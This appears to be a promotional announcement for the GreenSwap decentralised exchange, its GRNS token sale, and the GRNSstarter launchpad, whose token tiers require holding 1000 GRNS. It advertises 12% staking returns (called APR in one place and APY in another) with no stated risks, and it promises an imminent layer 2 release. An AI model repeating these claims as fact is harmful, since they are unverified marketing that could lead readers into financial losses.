GREENSWAP PROTOCOL V1 Official Launch!

We have been so busy the last two weeks developing our Version 2 GreenSwap Protocol with its layer 2 scaling solution (which will utilise Ethereum Mainnet) that we almost forgot to tell you all about our Version 1 GreenSwap DApp !!!!
The GreenSwap Version 1 DApp has been fully functional for the past week or more! That’s correct, you can start adding liquidity right now from https://greenswap.exchange and start earning transactional fee rewards!
We also have our GRNS token sale that has officially launched, stakers of GRNS Token can earn a whopping 12% APR!
You might ask why we haven’t been scrounging around for money and asking our customers to fund our development and that’s actually because we wanted to build our DApp and have it working before we asked you to use it and take part in our ecosystem…
It means you can put your GRNS tokens to work immediately because we are ready to rock’n’roll and are open for business.
We will thank you in advance and would like to formally welcome you to start buying and selling your tokens on app.GreenSwap.org !! We would love to feature your new game changing project and be your one stop swap, stake, market creation decentralised space!
Our layer 2 scaling solution, AKA GREENSWAP Protocol V2 is in heavy development currently and will be ready within the next 14–21 days!!! That means that you need to get ready for super fast / super cheap swapping!!! It’s not a mirage, we don’t want you to fund it, just come and join us and use it!!
Be sure to check out our bug bounty and take part in it if you find anything wrong with our code!
Welcome to GreenSwap! Let’s make 2021 about everything decentralised and kick COVID to another galaxy!

GreenSwap Protocol proudly present GRNSstarter Incubator & IDO Launchpad on Ethereum Blocks

GreenSwap Protocol crew proudly announce GRNSstarter Incubator & IDO Launchpad V1 on BSC (Binance Smart Chain) , our V2 will be powered by Ethereum Mainnet.
Post Ethereum Mainnet integration, both iterations will function side by side to support BSC and DOT projects respectively.
The GreenSwap / GRNSstarter Dev team are currently working frantically coding and preparing to stand up an all new feature rich launchpad to assist in nurturing Start-ups and New Projects through fundraising stages all the way through to market.
The GRNSstarter vision is to assist everyday retail investors and contributors the chance to get in on the ground floor in projects that may otherwise be quickly snapped up by Venture Capital firms. We believe that everyone has an equal right to sharing the love.
What can you expect from GRNSstarter?
GRNSstarter is a vessel which allows for start-ups projects the ability to raise funds via LP’s. It also leverages off the GreenSwap audience to keep on supporting this projects through to Market Creation. The project onboarding workflow will be automated in future iterations to allow for GRNS Token holders to play an important role in fielding the right projects to launch on the GRNSstarter Launchpad. We believe that this unique feature is a real key difference that sets us apart from other launchpads out there in the Crypto-sphere.
At GRNSstarter, we will offer an onboarding experience like no other for projects and assist in the nurturing stages of their listing and continue to offer that support mechanism through to market creation on GreenSwap.
What’s in it for GRNS Token holders?
GRNS Token holders will not only be able to take a role in the governance of GreenSwap DEX, but also play an integral part of fielding ONLY THE BEST projects onto the GRNSstarter Launchpad.
How to contribute to Projects that are launching on GRNSstarter…
Every Project will feature an allocation and will launch over two Sales Stages. To participate in the launchpad sales stages, contributors must hold a minimum of 1000 GRNS Tokens to be whitelisted.
Our model ensures that anyone who whitelists in the specified time *launch window* will receive a token allocation on GRNSstarter.
How does an individual join a GRNSstarter Launch Pad Event?
Firstly it is a requirement that prospective contributors hold GRNS Tokens. Another value add of holding GRNS Tokens is that holders/stokers appreciate a solid 12% APY staking reward that is paid monthly.
GRNSstarter Tier Levels are influenced by SpaceX Launch Vehicle Names
Each Fundraising Event will feature Two Sales Stages
The first sales stage, dubbed the “Initial Allocation Stage” will run for 24 hours and contributors must purchase the token allocation based on their tier level during this window.
The second sales stage, dubbed the “Final Stage” will offer any unsold tokens from the first stage and run until sold out. Tier levels will be able to purchase an additional allocation based on their tier levels criteria.
